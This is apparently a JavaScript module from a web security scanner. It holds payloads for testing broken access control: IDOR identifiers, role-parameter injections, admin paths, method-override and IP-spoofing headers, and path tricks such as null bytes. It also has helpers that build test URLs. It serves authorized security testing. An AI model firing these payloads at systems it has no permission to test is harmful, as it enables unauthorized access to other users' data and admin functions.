// Access Control Payloads
// Comprehensive payload database for broken access control testing

const AccessControlPayloads = {
    // Horizontal Privilege Escalation (IDOR)
    idor: {
        numeric: ['1', '2', '3', '100', '999', '1000'],
        sequential: ['user1', 'user2', 'admin', 'administrator'],
        uuid: ['00000000-0000-0000-0000-000000000001', '11111111-1111-1111-1111-111111111111'],
        encoded: ['MQ==', 'Mg==', 'YWRtaW4='] // base64: 1, 2, admin
    },

    // Vertical Privilege Escalation
    privilegeEscalation: {
        roleParameters: [
            'role=admin',
            'role=administrator',
            'isAdmin=true',
            'admin=1',
            'privilege=admin',
            'userType=admin',
            'accountType=admin'
        ],
        adminPaths: [
            '/admin',
            '/administrator',
            '/admin/panel',
            '/admin/dashboard',
            '/admin/users',
            '/admin/delete',
            '/api/admin',
            '/management',
            '/control-panel'
        ]
    },

    // HTTP Method Override
    methodOverride: [
        'X-HTTP-Method-Override: PUT',
        'X-HTTP-Method-Override: DELETE',
        'X-HTTP-Method-Override: PATCH',
        'X-Method-Override: PUT',
        'X-Method-Override: DELETE',
        '_method=PUT',
        '_method=DELETE'
    ],

    // Referer-based Access Control
    refererBypass: [
        'Referer: https://TARGET/admin',
        'Referer: https://localhost/admin',
        'Referer: https://127.0.0.1/admin'
    ],

    // Header Manipulation
    headerManipulation: [
        'X-Original-URL: /admin',
        'X-Rewrite-URL: /admin',
        'X-Forwarded-For: 127.0.0.1',
        'X-Forwarded-For: localhost',
        'X-Custom-IP-Authorization: 127.0.0.1',
        'X-Originating-IP: 127.0.0.1',
        'X-Remote-IP: 127.0.0.1',
        'X-Client-IP: 127.0.0.1'
    ],

    // Path Manipulation
    pathManipulation: [
        '/admin/../admin',
        '/./admin',
        '//admin',
        '/admin/',
        '/admin/.',
        '/admin/..',
        '/admin;',
        '/admin%20',
        '/admin%09',
        '/admin%00'
    ],

    // Multi-step Process Bypass
    multiStepBypass: [
        'step=3',
        'stage=final',
        'confirmed=true',
        'validated=1'
    ]
};

// Test Scenarios
const TestScenarios = {
    idor: {
        name: 'IDOR - Insecure Direct Object Reference',
        description: 'Access other users\' resources by changing ID parameters',
        tests: [
            { param: 'id', values: ['1', '2', '100'] },
            { param: 'userId', values: ['1', '2', 'admin'] },
            { param: 'accountId', values: ['1', '2', '999'] },
            { param: 'orderId', values: ['1', '2', '100'] }
        ]
    },

    privilegeEscalation: {
        name: 'Vertical Privilege Escalation',
        description: 'Access admin functionality as regular user',
        tests: [
            { type: 'role-param', payloads: AccessControlPayloads.privilegeEscalation.roleParameters },
            { type: 'admin-path', payloads: AccessControlPayloads.privilegeEscalation.adminPaths }
        ]
    },

    methodOverride: {
        name: 'HTTP Method Override',
        description: 'Bypass access controls via method override',
        tests: [
            { headers: AccessControlPayloads.methodOverride }
        ]
    },

    refererBypass: {
        name: 'Referer-based Bypass',
        description: 'Bypass referer-based access control',
        tests: [
            { headers: AccessControlPayloads.refererBypass }
        ]
    },

    headerManipulation: {
        name: 'Header Manipulation',
        description: 'Bypass via custom headers',
        tests: [
            { headers: AccessControlPayloads.headerManipulation }
        ]
    },

    pathManipulation: {
        name: 'Path Manipulation',
        description: 'Bypass via URL path tricks',
        tests: [
            { paths: AccessControlPayloads.pathManipulation }
        ]
    }
};

// Helper functions
function getIDORPayloads(paramType = 'numeric') {
    return AccessControlPayloads.idor[paramType] || AccessControlPayloads.idor.numeric;
}

function getPrivilegeEscalationPayloads() {
    return [
        ...AccessControlPayloads.privilegeEscalation.roleParameters,
        ...AccessControlPayloads.privilegeEscalation.adminPaths
    ];
}

function getAllAccessControlPayloads() {
    const allPayloads = [];

    // IDOR payloads
    Object.values(AccessControlPayloads.idor).forEach(arr => allPayloads.push(...arr));

    // Privilege escalation
    Object.values(AccessControlPayloads.privilegeEscalation).forEach(arr => allPayloads.push(...arr));

    // Other payloads
    allPayloads.push(...AccessControlPayloads.methodOverride);
    allPayloads.push(...AccessControlPayloads.refererBypass);
    allPayloads.push(...AccessControlPayloads.headerManipulation);
    allPayloads.push(...AccessControlPayloads.pathManipulation);
    allPayloads.push(...AccessControlPayloads.multiStepBypass);

    return allPayloads;
}

function getPayloadCount() {
    return getAllAccessControlPayloads().length;
}

function buildTestURL(baseUrl, param, value) {
    try {
        const url = new URL(baseUrl);
        url.searchParams.set(param, value);
        return url.toString();
    } catch {
        return `${baseUrl}?${param}=${value}`;
    }
}

function buildAdminURL(baseUrl, adminPath) {
    try {
        const url = new URL(baseUrl);
        return url.origin + adminPath;
    } catch {
        return adminPath;
    }
}

// Export for use in scanner
if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        AccessControlPayloads,
        TestScenarios,
        getIDORPayloads,
        getPrivilegeEscalationPayloads,
        getAllAccessControlPayloads,
        getPayloadCount,
        buildTestURL,
        buildAdminURL
    };
}
